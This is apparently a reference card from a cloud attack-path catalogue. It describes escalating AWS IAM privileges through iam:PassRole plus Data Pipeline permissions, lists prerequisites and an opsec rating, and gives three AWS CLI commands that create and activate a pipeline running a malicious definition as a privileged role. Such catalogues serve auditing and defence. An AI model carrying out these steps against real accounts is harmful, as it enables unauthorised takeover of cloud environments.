# DataPipeline - AWS IAM Privilege Escalation Paths
> Source: pathfinding.cloud (DataDog Security Labs)

### iam:PassRole + datapipeline:CreatePipeline + datapipeline:PutPipelineDefinition + datapipeline:ActivatePipeline [added: 2026-04]
- **Tags:** #Iam #Datapipeline #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + datapipeline service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, datapipeline:CreatePipeline, datapipeline:PutPipelineDefinition, datapipeline:ActivatePipeline; A role must exist that trusts datapipeline.amazonaws.com or elasticmapreduce.ama
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [datapipeline-001] A principal with `iam:PassRole`, `datapipeline:CreatePipeline`, `datapipeline:PutPipelineDefinition`, and `datapipeline:ActivatePipeline` can create a new Data Pipeline that executes arbitrary code with the permissions of a passed IAM role. Data Pipeline can run shell commands on EC2 instances or EMR clusters, allowing privilege escalation. The level of access gained depends on the permissions of 
- **Payload/Method:**
```
# Step 1: Create a new Data Pipeline
aws datapipeline create-pipeline --name privesc-pipeline --unique-id privesc-$(date +%s)

# Step 2: Define a pipeline that runs arbitrary shell commands with the privileged role
aws datapipeline put-pipeline-definition --pipeline-id PIPELINE_ID \
  --pipeline-definition file://malicious-pipeline.json

# Step 3: Activate the pipeline to execute the malicious code
aws datapipeline activate-pipeline --pipeline-id PIPELINE_ID
```
